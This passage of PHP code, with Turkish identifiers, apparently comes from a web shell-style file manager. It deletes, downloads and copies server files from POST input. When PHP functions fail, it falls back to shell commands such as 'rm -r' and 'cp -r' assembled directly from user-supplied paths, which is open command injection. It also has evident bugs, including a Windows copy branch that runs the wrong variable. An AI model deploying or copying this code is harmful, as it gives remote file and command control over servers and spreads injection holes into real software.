            echo "<input type='hidden' name='adress[]' value='$islemyap'></input>";
            echo "</pre>";
        }
        echo "<input type='submit' name='kopy' value='Kopyala' class='islemler_dugme'></input></form>";
    }
    if($islem == "sil"){
        $islemler = $_POST['islemler'];
        foreach($islemler as $yap){
            if(is_file($yap)){
                if(unlink($yap)){
                    echo "<META http-equiv='Refresh' content='0;'>";
                }else{
                    cmd("rm $yap");
                    echo "<META http-equiv='Refresh' content='0;'>";
                }   
            }else{
                if(rmdir($yap)){
                    echo "<META http-equiv='Refresh' content='0;'>";
                }else{
                    if($sistem == "Linux"){
                        if(cmd("rm -r $yap")){
                            echo "<META http-equiv='Refresh' content='0;'>";
                        }
                        else{
                            deleteDirectory($yap);
                            echo "<META http-equiv='Refresh' content='0;'>";                            
                        }
                    }else{
                       if(cmd("rmdir $yap /s")){
                            echo "<META http-equiv='Refresh' content='0;'>";
                       }
                       else{
                            deleteDirectory($yap);
                            echo "<META http-equiv='Refresh' content='0;'>";
                       }
                    }
                }
            }
        }
    }
    if($islem == "indir"){
        $islemler = $_POST['islemler'];
        foreach($islemler as $islem){
            if(is_file($islem)){
                $islem = htmlspecialchars($islem);
                header("Content-Disposition: attachment; filename=''". basename($islem));
                header("Content-Length: " . filesize($islem));
                header("Content-Type: application/octet-stream;");
                readfile(htmlentities($islem));
            }
        }
    }
}
if($_POST['kopy']){
    $cap = $_POST['kopyala'];
    $cup = $_POST['adress'];
    foreach($cup as $git){
        foreach($cap  as $isim){
            if($sistem == "Linux"){
                $kod = "cp -r $git $isim";
                cmd($kod);
            }else{
                $komut = "xcopy $git $isim";
                cmd($kod);
            }
        }
    }
}
?>